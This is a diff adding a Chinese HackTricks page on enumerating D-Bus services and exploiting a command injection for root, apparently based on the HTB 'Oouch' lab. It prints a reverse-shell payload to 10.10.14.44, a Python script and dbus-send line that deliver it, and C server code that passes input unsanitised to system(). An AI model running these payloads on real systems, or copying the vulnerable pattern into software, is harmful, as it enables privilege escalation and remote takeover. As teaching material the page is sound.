@@ -1,0 +1,617 @@
+<!DOCTYPE HTML>
+<html lang="zh" class="light sidebar-visible" dir="ltr">
+    <head>
+        <!-- Book generated using mdBook -->
+        <meta charset="UTF-8">
+        <title>D-Bus Enumeration &amp; Command Injection Privilege Escalation</title>
+
+
+        <!-- Custom HTML head -->
+
+        <meta name="description" content="">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="theme-color" content="#ffffff">
+
+        <link rel="icon" href="../../favicon.svg">
+        <link rel="shortcut icon" href="../../favicon.png">
+        <link rel="stylesheet" href="../../css/variables.css">
+        <link rel="stylesheet" href="../../css/general.css">
+        <link rel="stylesheet" href="../../css/chrome.css">
+        <link rel="stylesheet" href="../../css/print.css" media="print">
+
+        <!-- Fonts -->
+        <link rel="stylesheet" href="../../FontAwesome/css/font-awesome.css">
+        <link rel="stylesheet" href="../../fonts/fonts.css">
+
+        <!-- Highlight.js Stylesheets -->
+        <link rel="stylesheet" href="../../highlight.css">
+        <link rel="stylesheet" href="../../tomorrow-night.css">
+        <link rel="stylesheet" href="../../ayu-highlight.css">
+
+        <!-- Custom theme stylesheets -->
+
+
+        <!-- Provide site root to javascript -->
+        <script>
+            var path_to_root = "../../";
+            var default_theme = window.matchMedia("(prefers-color-scheme: dark)").matches ? "navy" : "light";
+        </script>
+        <!-- Start loading toc.js asap -->
+        <script src="../../toc.js"></script>
+    </head>
+    <body>
+    <div id="body-container">
+        <!-- Work around some values being stored in localStorage wrapped in quotes -->
+        <script>
+            try {
+                var theme = localStorage.getItem('mdbook-theme');
+                var sidebar = localStorage.getItem('mdbook-sidebar');
+
+                if (theme.startsWith('"') && theme.endsWith('"')) {
+                    localStorage.setItem('mdbook-theme', theme.slice(1, theme.length - 1));
+                }
+
+                if (sidebar.startsWith('"') && sidebar.endsWith('"')) {
+                    localStorage.setItem('mdbook-sidebar', sidebar.slice(1, sidebar.length - 1));
+                }
+            } catch (e) { }
+        </script>
+
+        <!-- Set the theme before any content is loaded, prevents flash -->
+        <script>
+            var theme;
+            try { theme = localStorage.getItem('mdbook-theme'); } catch(e) { }
+            if (theme === null || theme === undefined) { theme = default_theme; }
+            const html = document.documentElement;
+            html.classList.remove('light')
+            html.classList.add(theme);
+            html.classList.add("js");
+        </script>
+
+        <input type="checkbox" id="sidebar-toggle-anchor" class="hidden">
+
+        <!-- Hide / unhide sidebar before it is displayed -->
+        <script>
+            var sidebar = null;
+            var sidebar_toggle = document.getElementById("sidebar-toggle-anchor");
+            if (document.body.clientWidth >= 1080) {
+                try { sidebar = localStorage.getItem('mdbook-sidebar'); } catch(e) { }
+                sidebar = sidebar || 'visible';
+            } else {
+                sidebar = 'hidden';
+            }
+            sidebar_toggle.checked = sidebar === 'visible';
+            html.classList.remove('sidebar-visible');
+            html.classList.add("sidebar-" + sidebar);
+        </script>
+
+        <nav id="sidebar" class="sidebar" aria-label="Table of contents">
+            <!-- populated by js -->
+            <mdbook-sidebar-scrollbox class="sidebar-scrollbox"></mdbook-sidebar-scrollbox>
+            <noscript>
+                <iframe class="sidebar-iframe-outer" src="../../toc.html"></iframe>
+            </noscript>
+            <div id="sidebar-resize-handle" class="sidebar-resize-handle">
+                <div class="sidebar-resize-indicator"></div>
+            </div>
+        </nav>
+
+        <div id="page-wrapper" class="page-wrapper">
+
+            <div class="page">
+                <div id="menu-bar-hover-placeholder"></div>
+                <div id="menu-bar" class="menu-bar sticky">
+                    <div class="left-buttons">
+                        <label id="sidebar-toggle" class="icon-button" for="sidebar-toggle-anchor" title="Toggle Table of Contents" aria-label="Toggle Table of Contents" aria-controls="sidebar">
+                            <i class="fa fa-bars"></i>
+                        </label>
+                        <button id="theme-toggle" class="icon-button" type="button" title="Change theme" aria-label="Change theme" aria-haspopup="true" aria-expanded="false" aria-controls="theme-list">
+                            <i class="fa fa-paint-brush"></i>
+                        </button>
+                        <ul id="theme-list" class="theme-popup" aria-label="Themes" role="menu">
+                            <li role="none"><button role="menuitem" class="theme" id="light">Light</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="rust">Rust</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="coal">Coal</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="navy">Navy</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="ayu">Ayu</button></li>
+                        </ul>
+                        <button id="search-toggle" class="icon-button" type="button" title="Search. (Shortkey: s)" aria-label="Toggle Searchbar" aria-expanded="false" aria-keyshortcuts="S" aria-controls="searchbar">
+                            <i class="fa fa-search"></i>
+                        </button>
+                    </div>
+
+                    <h1 class="menu-title"></h1>
+
+                    <div class="right-buttons">
+                        <a href="../../print.html" title="Print this book" aria-label="Print this book">
+                            <i id="print-button" class="fa fa-print"></i>
+                        </a>
+
+                    </div>
+                </div>
+
+                <div id="search-wrapper" class="hidden">
+                    <form id="searchbar-outer" class="searchbar-outer">
+                        <input type="search" id="searchbar" name="searchbar" placeholder="Search this book ..." aria-controls="searchresults-outer" aria-describedby="searchresults-header">
+                    </form>
+                    <div id="searchresults-outer" class="searchresults-outer hidden">
+                        <div id="searchresults-header" class="searchresults-header"></div>
+                        <ul id="searchresults">
+                        </ul>
+                    </div>
+                </div>
+
+                <!-- Apply ARIA attributes after the sidebar and the sidebar toggle button are added to the DOM -->
+                <script>
+                    document.getElementById('sidebar-toggle').setAttribute('aria-expanded', sidebar === 'visible');
+                    document.getElementById('sidebar').setAttribute('aria-hidden', sidebar !== 'visible');
+                    Array.from(document.querySelectorAll('#sidebar a')).forEach(function(link) {
+                        link.setAttribute('tabIndex', sidebar === 'visible' ? 0 : -1);
+                    });
+                </script>
+
+                <div id="content" class="content">
+                    <main>
+                        <h1 id="d-bus-enumeration--command-injection-privilege-escalation"><a class="header" href="#d-bus-enumeration--command-injection-privilege-escalation">D-Bus Enumeration &amp; Command Injection Privilege Escalation</a></h1>
+<p>{% hint style="success" %}
+Learn &amp; practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/arte"><strong>HackTricks Training AWS Red Team Expert (ARTE)</strong></a><img src="/.gitbook/assets/arte.png" alt="" data-size="line"><br />
+Learn &amp; practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/grte"><strong>HackTricks Training GCP Red Team Expert (GRTE)</strong><img src="/.gitbook/assets/grte.png" alt="" data-size="line"></a></p>
+<details>
+<summary>Support HackTricks</summary>
+<ul>
+<li>Check the <a href="https://github.com/sponsors/carlospolop"><strong>subscription plans</strong></a>!</li>
+<li><strong>Join the</strong> 💬 <a href="https://discord.gg/hRep4RUj7f"><strong>Discord group</strong></a> or the <a href="https://t.me/peass"><strong>telegram group</strong></a> or <strong>follow</strong> us on <strong>Twitter</strong> 🐦 <a href="https://twitter.com/hacktricks_live"><strong>@hacktricks_live</strong></a><strong>.</strong></li>
+<li><strong>Share hacking tricks by submitting PRs to the</strong> <a href="https://github.com/carlospolop/hacktricks"><strong>HackTricks</strong></a> and <a href="https://github.com/carlospolop/hacktricks-cloud"><strong>HackTricks Cloud</strong></a> github repos.</li>
+</ul>
+</details>
+{% endhint %}
+<h2 id="gui-enumeration"><a class="header" href="#gui-enumeration"><strong>GUI enumeration</strong></a></h2>
+<p>D-Bus 被用作 Ubuntu 桌面环境中的进程间通信 (IPC) 中介。在 Ubuntu 中，观察到多个消息总线的并发操作：系统总线，主要由 <strong>特权服务用于暴露与系统相关的服务</strong>，以及每个登录用户的会话总线，仅暴露与该特定用户相关的服务。这里的重点主要是系统总线，因为它与以更高特权（例如，root）运行的服务相关，我们的目标是提升特权。值得注意的是，D-Bus 的架构为每个会话总线采用了一个“路由器”，负责根据客户端为其希望与之通信的服务指定的地址，将客户端消息重定向到适当的服务。</p>
+<p>D-Bus 上的服务由它们暴露的 <strong>对象</strong> 和 <strong>接口</strong> 定义。对象可以类比于标准 OOP 语言中的类实例，每个实例通过 <strong>对象路径</strong> 唯一标识。该路径类似于文件系统路径，唯一标识服务暴露的每个对象。一个关键的研究接口是 <strong>org.freedesktop.DBus.Introspectable</strong> 接口，具有一个方法 Introspect。该方法返回对象支持的方法、信号和属性的 XML 表示，这里重点关注方法，同时省略属性和信号。</p>
+<p>为了与 D-Bus 接口进行通信，使用了两个工具：一个名为 <strong>gdbus</strong> 的 CLI 工具，用于在脚本中轻松调用 D-Bus 暴露的方法，以及 <a href="https://wiki.gnome.org/Apps/DFeet"><strong>D-Feet</strong></a>，这是一个基于 Python 的 GUI 工具，旨在枚举每个总线可用的服务并显示每个服务包含的对象。</p>
+<pre><code class="language-bash">sudo apt-get install d-feet
+</code></pre>
+<p><img src="https://unit42.paloaltonetworks.com/wp-content/uploads/2019/07/word-image-21.png" alt="https://unit42.paloaltonetworks.com/wp-content/uploads/2019/07/word-image-21.png" /></p>
+<p><img src="https://unit42.paloaltonetworks.com/wp-content/uploads/2019/07/word-image-22.png" alt="https://unit42.paloaltonetworks.com/wp-content/uploads/2019/07/word-image-22.png" /></p>
+<p>在第一张图片中，显示了注册到 D-Bus 系统总线的服务，特别是在选择系统总线按钮后突出显示了 <strong>org.debin.apt</strong>。D-Feet 查询此服务以获取对象，显示所选对象的接口、方法、属性和信号，如第二张图片所示。每个方法的签名也有详细说明。</p>
+<p>一个显著的特点是显示服务的 <strong>进程 ID (pid)</strong> 和 <strong>命令行</strong>，这对于确认服务是否以提升的权限运行非常有用，这对研究的相关性很重要。</p>
+<p><strong>D-Feet 还允许方法调用</strong>：用户可以输入 Python 表达式作为参数，D-Feet 会将其转换为 D-Bus 类型，然后传递给服务。</p>
+<p>但是，请注意 <strong>某些方法需要身份验证</strong>，才能允许我们调用它们。我们将忽略这些方法，因为我们的目标是首先在没有凭据的情况下提升我们的权限。</p>
+<p>还要注意，某些服务会查询另一个名为 org.freedeskto.PolicyKit1 的 D-Bus 服务，以确定用户是否应该被允许执行某些操作。</p>
+<h2 id="命令行枚举"><a class="header" href="#命令行枚举"><strong>命令行枚举</strong></a></h2>
+<h3 id="列出服务对象"><a class="header" href="#列出服务对象">列出服务对象</a></h3>
+<p>可以使用以下命令列出打开的 D-Bus 接口：</p>
+<pre><code class="language-bash">busctl list #List D-Bus interfaces
+
+NAME                                   PID PROCESS         USER             CONNECTION    UNIT                      SE
+:1.0                                     1 systemd         root             :1.0          init.scope                -
+:1.1345                              12817 busctl          qtc              :1.1345       session-729.scope         72
+:1.2                                  1576 systemd-timesyn systemd-timesync :1.2          systemd-timesyncd.service -
+:1.3                                  2609 dbus-server     root             :1.3          dbus-server.service       -
+:1.4                                  2606 wpa_supplicant  root             :1.4          wpa_supplicant.service    -
+:1.6                                  2612 systemd-logind  root             :1.6          systemd-logind.service    -
+:1.8                                  3087 unattended-upgr root             :1.8          unattended-upgrades.serv… -
+:1.820                                6583 systemd         qtc              :1.820        user@1000.service         -
+com.ubuntu.SoftwareProperties            - -               -                (activatable) -                         -
+fi.epitest.hostap.WPASupplicant       2606 wpa_supplicant  root             :1.4          wpa_supplicant.service    -
+fi.w1.wpa_supplicant1                 2606 wpa_supplicant  root             :1.4          wpa_supplicant.service    -
+htb.oouch.Block                       2609 dbus-server     root             :1.3          dbus-server.service       -
+org.bluez                                - -               -                (activatable) -                         -
+org.freedesktop.DBus                     1 systemd         root             -             init.scope                -
+org.freedesktop.PackageKit               - -               -                (activatable) -                         -
+org.freedesktop.PolicyKit1               - -               -                (activatable) -                         -
+org.freedesktop.hostname1                - -               -                (activatable) -                         -
+org.freedesktop.locale1                  - -               -                (activatable) -                         -
+</code></pre>
+<h4 id="连接"><a class="header" href="#连接">连接</a></h4>
+<p><a href="https://en.wikipedia.org/wiki/D-Bus">来自维基百科：</a> 当一个进程建立与总线的连接时，总线会为该连接分配一个特殊的总线名称，称为 <em>唯一连接名称</em>。这种类型的总线名称是不可变的——只要连接存在，就保证不会改变——更重要的是，它们在总线的生命周期内不能被重用。这意味着，即使同一个进程关闭与总线的连接并创建一个新的连接，也不会有其他连接被分配这样的唯一连接名称。唯一连接名称很容易识别，因为它们以——否则被禁止的——冒号字符开头。</p>
+<h3 id="服务对象信息"><a class="header" href="#服务对象信息">服务对象信息</a></h3>
+<p>然后，您可以通过以下方式获取有关接口的一些信息：</p>
+<pre><code class="language-bash">busctl status htb.oouch.Block #Get info of "htb.oouch.Block" interface
+
+PID=2609
+PPID=1
+TTY=n/a
+UID=0
+EUID=0
+SUID=0
+FSUID=0
+GID=0
+EGID=0
+SGID=0
+FSGID=0
+SupplementaryGIDs=
+Comm=dbus-server
+CommandLine=/root/dbus-server
+Label=unconfined
+CGroup=/system.slice/dbus-server.service
+Unit=dbus-server.service
+Slice=system.slice
+UserUnit=n/a
+UserSlice=n/a
+Session=n/a
+AuditLoginUID=n/a
+AuditSessionID=n/a
+UniqueName=:1.3
+EffectiveCapabilities=cap_chown cap_dac_override cap_dac_read_search
+cap_fowner cap_fsetid cap_kill cap_setgid
+cap_setuid cap_setpcap cap_linux_immutable cap_net_bind_service
+cap_net_broadcast cap_net_admin cap_net_raw cap_ipc_lock
+cap_ipc_owner cap_sys_module cap_sys_rawio cap_sys_chroot
+cap_sys_ptrace cap_sys_pacct cap_sys_admin cap_sys_boot
+cap_sys_nice cap_sys_resource cap_sys_time cap_sys_tty_config
+cap_mknod cap_lease cap_audit_write cap_audit_control
+cap_setfcap cap_mac_override cap_mac_admin cap_syslog
+cap_wake_alarm cap_block_suspend cap_audit_read
+PermittedCapabilities=cap_chown cap_dac_override cap_dac_read_search
+cap_fowner cap_fsetid cap_kill cap_setgid
+cap_setuid cap_setpcap cap_linux_immutable cap_net_bind_service
+cap_net_broadcast cap_net_admin cap_net_raw cap_ipc_lock
+cap_ipc_owner cap_sys_module cap_sys_rawio cap_sys_chroot
+cap_sys_ptrace cap_sys_pacct cap_sys_admin cap_sys_boot
+cap_sys_nice cap_sys_resource cap_sys_time cap_sys_tty_config
+cap_mknod cap_lease cap_audit_write cap_audit_control
+cap_setfcap cap_mac_override cap_mac_admin cap_syslog
+cap_wake_alarm cap_block_suspend cap_audit_read
+InheritableCapabilities=
+BoundingCapabilities=cap_chown cap_dac_override cap_dac_read_search
+cap_fowner cap_fsetid cap_kill cap_setgid
+cap_setuid cap_setpcap cap_linux_immutable cap_net_bind_service
+cap_net_broadcast cap_net_admin cap_net_raw cap_ipc_lock
+cap_ipc_owner cap_sys_module cap_sys_rawio cap_sys_chroot
+cap_sys_ptrace cap_sys_pacct cap_sys_admin cap_sys_boot
+cap_sys_nice cap_sys_resource cap_sys_time cap_sys_tty_config
+cap_mknod cap_lease cap_audit_write cap_audit_control
+cap_setfcap cap_mac_override cap_mac_admin cap_syslog
+cap_wake_alarm cap_block_suspend cap_audit_read
+</code></pre>
+<h3 id="列出服务对象的接口"><a class="header" href="#列出服务对象的接口">列出服务对象的接口</a></h3>
+<p>您需要拥有足够的权限。</p>
+<pre><code class="language-bash">busctl tree htb.oouch.Block #Get Interfaces of the service object
+
+└─/htb
+└─/htb/oouch
+└─/htb/oouch/Block
+</code></pre>
+<h3 id="introspect-interface-of-a-service-object"><a class="header" href="#introspect-interface-of-a-service-object">Introspect Interface of a Service Object</a></h3>
+<p>注意在这个例子中，使用 <code>tree</code> 参数选择了最新发现的接口（<em>见前一节</em>）：</p>
+<pre><code class="language-bash">busctl introspect htb.oouch.Block /htb/oouch/Block #Get methods of the interface
+
+NAME                                TYPE      SIGNATURE RESULT/VALUE FLAGS
+htb.oouch.Block                     interface -         -            -
+.Block                              method    s         s            -
+org.freedesktop.DBus.Introspectable interface -         -            -
+.Introspect                         method    -         s            -
+org.freedesktop.DBus.Peer           interface -         -            -
+.GetMachineId                       method    -         s            -
+.Ping                               method    -         -            -
+org.freedesktop.DBus.Properties     interface -         -            -
+.Get                                method    ss        v            -
+.GetAll                             method    s         a{sv}        -
+.Set                                method    ssv       -            -
+.PropertiesChanged                  signal    sa{sv}as  -            -
+</code></pre>
+<p>注意接口 <code>htb.oouch.Block</code> 的方法 <code>.Block</code>（我们感兴趣的那个）。其他列的 "s" 可能意味着它期望一个字符串。</p>
+<h3 id="监控捕获接口"><a class="header" href="#监控捕获接口">监控/捕获接口</a></h3>
+<p>拥有足够的权限（仅有 <code>send_destination</code> 和 <code>receive_sender</code> 权限是不够的）你可以 <strong>监控 D-Bus 通信</strong>。</p>
+<p>为了 <strong>监控</strong> 一次 <strong>通信</strong> 你需要 <strong>root</strong> 权限。如果你在成为 root 时仍然遇到问题，请查看 <a href="https://piware.de/2013/09/how-to-watch-system-d-bus-method-calls/">https://piware.de/2013/09/how-to-watch-system-d-bus-method-calls/</a> 和 <a href="https://wiki.ubuntu.com/DebuggingDBus">https://wiki.ubuntu.com/DebuggingDBus</a></p>
+<p>{% hint style="warning" %}
+如果你知道如何配置 D-Bus 配置文件以 <strong>允许非 root 用户嗅探</strong> 通信，请 <strong>联系我</strong>！
+{% endhint %}</p>
+<p>监控的不同方法：</p>
+<pre><code class="language-bash">sudo busctl monitor htb.oouch.Block #Monitor only specified
+sudo busctl monitor #System level, even if this works you will only see messages you have permissions to see
+sudo dbus-monitor --system #System level, even if this works you will only see messages you have permissions to see
+</code></pre>
+<p>在以下示例中，接口 <code>htb.oouch.Block</code> 被监控，并且 <strong>通过误传发送了消息 "</strong><em><strong>lalalalal</strong></em><strong>"</strong>：</p>
+<pre><code class="language-bash">busctl monitor htb.oouch.Block
+
+Monitoring bus message stream.
+‣ Type=method_call  Endian=l  Flags=0  Version=1  Priority=0 Cookie=2
+Sender=:1.1376  Destination=htb.oouch.Block  Path=/htb/oouch/Block  Interface=htb.oouch.Block  Member=Block
+UniqueName=:1.1376
+MESSAGE "s" {
+STRING "lalalalal";
+};
+
+‣ Type=method_return  Endian=l  Flags=1  Version=1  Priority=0 Cookie=16  ReplyCookie=2
+Sender=:1.3  Destination=:1.1376
+UniqueName=:1.3
+MESSAGE "s" {
+STRING "Carried out :D";
+};
+</code></pre>
+<p>您可以使用 <code>capture</code> 代替 <code>monitor</code> 将结果保存到 pcap 文件中。</p>
+<h4 id="过滤所有噪音"><a class="header" href="#过滤所有噪音">过滤所有噪音 <a href="#filtering_all_the_noise" id="filtering_all_the_noise"></a></a></h4>
+<p>如果总线上的信息太多，可以传递一个匹配规则，如下所示：</p>
+<pre><code class="language-bash">dbus-monitor "type=signal,sender='org.gnome.TypingMonitor',interface='org.gnome.TypingMonitor'"
+</code></pre>
+<p>多个规则可以被指定。如果一条消息匹配_任何_规则，该消息将被打印。像这样：</p>
+<pre><code class="language-bash">dbus-monitor "type=error" "sender=org.freedesktop.SystemToolsBackends"
+</code></pre>
+<pre><code class="language-bash">dbus-monitor "type=method_call" "type=method_return" "type=error"
+</code></pre>
+<p>查看<a href="http://dbus.freedesktop.org/doc/dbus-specification.html">D-Bus文档</a>以获取有关匹配规则语法的更多信息。</p>
+<h3 id="更多"><a class="header" href="#更多">更多</a></h3>
+<p><code>busctl</code>还有更多选项，<a href="https://www.freedesktop.org/software/systemd/man/busctl.html"><strong>在这里找到所有选项</strong></a>。</p>
+<h2 id="易受攻击的场景"><a class="header" href="#易受攻击的场景"><strong>易受攻击的场景</strong></a></h2>
+<p>作为用户<strong>qtc 在主机 "oouch" 来自 HTB</strong>，您可以找到一个<strong>意外的 D-Bus 配置文件</strong>，位于 <em>/etc/dbus-1/system.d/htb.oouch.Block.conf</em>：</p>
+<pre><code class="language-xml">&lt;?xml version="1.0" encoding="UTF-8"?&gt; &lt;!-- -*- XML -*- --&gt;
+
+&lt;!DOCTYPE busconfig PUBLIC
+"-//freedesktop//DTD D-BUS Bus Configuration 1.0//EN"
+"http://www.freedesktop.org/standards/dbus/1.0/busconfig.dtd"&gt;
+
+&lt;busconfig&gt;
+
+&lt;policy user="root"&gt;
+&lt;allow own="htb.oouch.Block"/&gt;
+&lt;/policy&gt;
+
+&lt;policy user="www-data"&gt;
+&lt;allow send_destination="htb.oouch.Block"/&gt;
+&lt;allow receive_sender="htb.oouch.Block"/&gt;
+&lt;/policy&gt;
+
+&lt;/busconfig&gt;
+</code></pre>
+<p>注意从之前的配置中，<strong>您需要是用户 <code>root</code> 或 <code>www-data</code> 才能通过此 D-BUS 通信发送和接收信息</strong>。</p>
+<p>作为用户 <strong>qtc</strong> 在 docker 容器 <strong>aeb4525789d8</strong> 内，您可以在文件 <em>/code/oouch/routes.py</em> 中找到一些与 dbus 相关的代码。这是有趣的代码：</p>
+<pre><code class="language-python">if primitive_xss.search(form.textfield.data):
+bus = dbus.SystemBus()
+block_object = bus.get_object('htb.oouch.Block', '/htb/oouch/Block')
+block_iface = dbus.Interface(block_object, dbus_interface='htb.oouch.Block')
+
+client_ip = request.environ.get('REMOTE_ADDR', request.remote_addr)
+response = block_iface.Block(client_ip)
+bus.close()
+return render_template('hacker.html', title='Hacker')
+</code></pre>
+<p>如您所见，它正在<strong>连接到 D-Bus 接口</strong>并将“client_ip”发送到**“Block”函数**。</p>
+<p>在 D-Bus 连接的另一端，有一些 C 编译的二进制文件在运行。此代码正在<strong>监听</strong> D-Bus 连接<strong>以获取 IP 地址，并通过 <code>system</code> 函数调用 iptables</strong> 来阻止给定的 IP 地址。<br />
+<strong>对 <code>system</code> 的调用故意存在命令注入漏洞</strong>，因此像以下这样的有效载荷将创建一个反向 shell：<code>;bash -c 'bash -i &gt;&amp; /dev/tcp/10.10.14.44/9191 0&gt;&amp;1' #</code></p>
+<h3 id="利用它"><a class="header" href="#利用它">利用它</a></h3>
+<p>在本页的末尾，您可以找到<strong>D-Bus 应用程序的完整 C 代码</strong>。在其中，您可以在第 91-97 行之间找到<strong>如何注册 <code>D-Bus 对象路径</code></strong> <strong>和 <code>接口名称</code></strong>。此信息将是发送信息到 D-Bus 连接所必需的：</p>
+<pre><code class="language-c">/* Install the object */
+r = sd_bus_add_object_vtable(bus,
+&amp;slot,
+"/htb/oouch/Block",  /* interface */
+"htb.oouch.Block",   /* service object */
+block_vtable,
+NULL);
+</code></pre>
+<p>此外，在第57行中，您可以发现<strong>为此D-Bus通信注册的唯一方法</strong>称为<code>Block</code>（<em><strong>这就是为什么在接下来的部分中，负载将被发送到服务对象<code>htb.oouch.Block</code>，接口<code>/htb/oouch/Block</code>和方法名<code>Block</code></strong></em>）：</p>
+<pre><code class="language-c">SD_BUS_METHOD("Block", "s", "s", method_block, SD_BUS_VTABLE_UNPRIVILEGED),
+</code></pre>
+<h4 id="python"><a class="header" href="#python">Python</a></h4>
+<p>以下Python代码将通过<code>block_iface.Block(runme)</code>将有效负载发送到D-Bus连接的<code>Block</code>方法（<em>请注意，它是从前面的代码块中提取的</em>）：</p>
+<pre><code class="language-python">import dbus
+bus = dbus.SystemBus()
+block_object = bus.get_object('htb.oouch.Block', '/htb/oouch/Block')
+block_iface = dbus.Interface(block_object, dbus_interface='htb.oouch.Block')
+runme = ";bash -c 'bash -i &gt;&amp; /dev/tcp/10.10.14.44/9191 0&gt;&amp;1' #"
+response = block_iface.Block(runme)
+bus.close()
+</code></pre>
+<h4 id="busctl-和-dbus-send"><a class="header" href="#busctl-和-dbus-send">busctl 和 dbus-send</a></h4>
+<pre><code class="language-bash">dbus-send --system --print-reply --dest=htb.oouch.Block /htb/oouch/Block htb.oouch.Block.Block string:';pring -c 1 10.10.14.44 #'
+</code></pre>
+<ul>
+<li><code>dbus-send</code> 是一个用于向“消息总线”发送消息的工具</li>
+<li>消息总线 – 一种软件，系统通过它使应用程序之间的通信变得简单。它与消息队列相关（消息按顺序排列），但在消息总线中，消息以订阅模型发送，并且速度非常快。</li>
+<li>“-system” 标签用于指明这是一个系统消息，而不是会话消息（默认情况下）。</li>
+<li>“–print-reply” 标签用于适当地打印我们的消息，并以人类可读的格式接收任何回复。</li>
+<li>“–dest=Dbus-Interface-Block” Dbus 接口的地址。</li>
+<li>“–string:” – 我们希望发送到接口的消息类型。有几种发送消息的格式，如双精度、字节、布尔值、整数、对象路径。在这些中，“对象路径”在我们想要将文件路径发送到 Dbus 接口时非常有用。在这种情况下，我们可以使用一个特殊文件（FIFO）来以文件名的形式将命令传递给接口。“string:;” – 这是为了再次调用对象路径，我们放置 FIFO 反向 shell 文件/命令。</li>
+</ul>
+<p><em>注意在 <code>htb.oouch.Block.Block</code> 中，第一部分 (<code>htb.oouch.Block</code>) 引用服务对象，最后一部分 (<code>.Block</code>) 引用方法名称。</em></p>
+<h3 id="c-代码"><a class="header" href="#c-代码">C 代码</a></h3>
+<p>{% code title="d-bus_server.c" %}</p>
+<pre><code class="language-c">//sudo apt install pkgconf
+//sudo apt install libsystemd-dev
+//gcc d-bus_server.c -o dbus_server `pkg-config --cflags --libs libsystemd`
+
+#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;string.h&gt;
+#include &lt;errno.h&gt;
+#include &lt;unistd.h&gt;
+#include &lt;systemd/sd-bus.h&gt;
+
+static int method_block(sd_bus_message *m, void *userdata, sd_bus_error *ret_error) {
+char* host = NULL;
+int r;
+
+/* Read the parameters */
+r = sd_bus_message_read(m, "s", &amp;host);
+if (r &lt; 0) {
+fprintf(stderr, "Failed to obtain hostname: %s\n", strerror(-r));
+return r;
+}
+
+char command[] = "iptables -A PREROUTING -s %s -t mangle -j DROP";
+
+int command_len = strlen(command);
+int host_len = strlen(host);
+
+char* command_buffer = (char *)malloc((host_len + command_len) * sizeof(char));
+if(command_buffer == NULL) {
+fprintf(stderr, "Failed to allocate memory\n");
+return -1;
+}
+
+sprintf(command_buffer, command, host);
+
+/* In the first implementation, we simply ran command using system(), since the expected DBus
+* to be threading automatically. However, DBus does not thread and the application will hang
+* forever if some user spawns a shell. Thefore we need to fork (easier than implementing real
+* multithreading)
+*/
+int pid = fork();
+
+if ( pid == 0 ) {
+/* Here we are in the child process. We execute the command and eventually exit. */
+system(command_buffer);
+exit(0);
+} else {
+/* Here we are in the parent process or an error occured. We simply send a genric message.
+* In the first implementation we returned separate error messages for success or failure.
+* However, now we cannot wait for results of the system call. Therefore we simply return
+* a generic. */
+return sd_bus_reply_method_return(m, "s", "Carried out :D");
+}
+r = system(command_buffer);
+}
+
+
+/* The vtable of our little object, implements the net.poettering.Calculator interface */
+static const sd_bus_vtable block_vtable[] = {
+SD_BUS_VTABLE_START(0),
+SD_BUS_METHOD("Block", "s", "s", method_block, SD_BUS_VTABLE_UNPRIVILEGED),
+SD_BUS_VTABLE_END
+};
+
+
+int main(int argc, char *argv[]) {
+/*
+* Main method, registeres the htb.oouch.Block service on the system dbus.
+*
+* Paramaters:
+*      argc            (int)             Number of arguments, not required
+*      argv[]          (char**)          Argument array, not required
+*
+* Returns:
+*      Either EXIT_SUCCESS ot EXIT_FAILURE. Howeverm ideally it stays alive
+*      as long as the user keeps it alive.
+*/
+
+
+/* To prevent a huge numer of defunc process inside the tasklist, we simply ignore client signals */
+signal(SIGCHLD,SIG_IGN);
+
+sd_bus_slot *slot = NULL;
+sd_bus *bus = NULL;
+int r;
+
+/* First we need to connect to the system bus. */
+r = sd_bus_open_system(&amp;bus);
+if (r &lt; 0)
+{
+fprintf(stderr, "Failed to connect to system bus: %s\n", strerror(-r));
+goto finish;
+}
+
+/* Install the object */
+r = sd_bus_add_object_vtable(bus,
+&amp;slot,
+"/htb/oouch/Block",  /* interface */
+"htb.oouch.Block",   /* service object */
+block_vtable,
+NULL);
+if (r &lt; 0) {
+fprintf(stderr, "Failed to install htb.oouch.Block: %s\n", strerror(-r));
+goto finish;
+}
+
+/* Register the service name to find out object */
+r = sd_bus_request_name(bus, "htb.oouch.Block", 0);
+if (r &lt; 0) {
+fprintf(stderr, "Failed to acquire service name: %s\n", strerror(-r));
+goto finish;
+}
+
+/* Infinite loop to process the client requests */
+for (;;) {
+/* Process requests */
+r = sd_bus_process(bus, NULL);
+if (r &lt; 0) {
+fprintf(stderr, "Failed to process bus: %s\n", strerror(-r));
+goto finish;
+}
+if (r &gt; 0) /* we processed a request, try to process another one, right-away */
+continue;
+
+/* Wait for the next request to process */
+r = sd_bus_wait(bus, (uint64_t) -1);
+if (r &lt; 0) {
+fprintf(stderr, "Failed to wait on bus: %s\n", strerror(-r));
+goto finish;
+}
+}
+
+finish:
+sd_bus_slot_unref(slot);
+sd_bus_unref(bus);
+
+return r &lt; 0 ? EXIT_FAILURE : EXIT_SUCCESS;
+}
+</code></pre>
+<p>{% endcode %}</p>
+<h2 id="参考文献"><a class="header" href="#参考文献">参考文献</a></h2>
+<ul>
+<li><a href="https://unit42.paloaltonetworks.com/usbcreator-d-bus-privilege-escalation-in-ubuntu-desktop/">https://unit42.paloaltonetworks.com/usbcreator-d-bus-privilege-escalation-in-ubuntu-desktop/</a></li>
+</ul>
+<p>{% hint style="success" %}
+学习和实践 AWS 黑客技术：<img src="/.gitbook/assets/arte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/arte"><strong>HackTricks 培训 AWS 红队专家 (ARTE)</strong></a><img src="/.gitbook/assets/arte.png" alt="" data-size="line"><br />
+学习和实践 GCP 黑客技术：<img src="/.gitbook/assets/grte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/grte"><strong>HackTricks 培训 GCP 红队专家 (GRTE)</strong><img src="/.gitbook/assets/grte.png" alt="" data-size="line"></a></p>
+<details>
+<summary>支持 HackTricks</summary>
+<ul>
+<li>查看 <a href="https://github.com/sponsors/carlospolop"><strong>订阅计划</strong></a>!</li>
+<li><strong>加入</strong> 💬 <a href="https://discord.gg/hRep4RUj7f"><strong>Discord 群组</strong></a> 或 <a href="https://t.me/peass"><strong>电报群组</strong></a> 或 <strong>在</strong> <strong>Twitter</strong> 🐦 <strong>上关注我们</strong> <a href="https://twitter.com/hacktricks_live"><strong>@hacktricks_live</strong></a><strong>.</strong></li>
